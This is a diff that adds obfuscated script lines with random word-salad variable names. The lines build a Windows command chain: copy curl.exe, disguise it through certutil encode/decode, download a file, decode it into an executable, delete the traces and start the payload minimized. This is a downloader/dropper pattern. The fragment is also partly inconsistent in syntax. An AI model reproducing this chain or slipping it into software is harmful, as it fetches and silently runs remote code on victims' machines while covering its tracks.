@@ -1,0 +1,13 @@
+C:\Windows\System32\cmd.exe /c xcopy C:\Windows\System32\curl.exe & certutil -encode curl.exe  frugiferousness_Cattell & certutil -decode  frugiferousness_Cattell Laie_roughers_seeded 
+&  Laie_roughers_seeded  Herero_Sasha_cumsha  -o  Mysis_needlers_Pakanbaru  & certutil -decode " + Mysis_needlers_Pakanbaru + " " + Hispanogallican_colloider + " & "
+roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "del " + spiker_albuminometer_Ramphastos + "\curl.exe & "
+coercend_rusticwork = coercend_rusticwork + Herero_Sasha_cumsha + Mysis_needlers_Pakanbaru
+roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "del " + frugiferousness_Cattell + " & "
+coercend_rusticwork = coercend_rusticwork + Hispanogallican_colloider + Mysis_needlers_Pakanbaru
+roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "del " + Laie_roughers_seeded + " & "
+coercend_rusticwork = coercend_rusticwork + Hispanogallican_colloider + roundfooted_disentangle_Laodicean
+roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "del " + Mysis_needlers_Pakanbaru + " & "
+'roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "START /MIN " +  Hispanogallican_colloider +" -e "
+roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "START /MIN " + Hispanogallican_colloider + " & exit"
+coercend_rusticwork = coercend_rusticwork + spiker_albuminometer_Ramphastos + roundfooted_disentangle_Laodicean
+'roundfooted_disentangle_Laodicean = roundfooted_disentangle_Laodicean + "cmd.exe -d & exit"
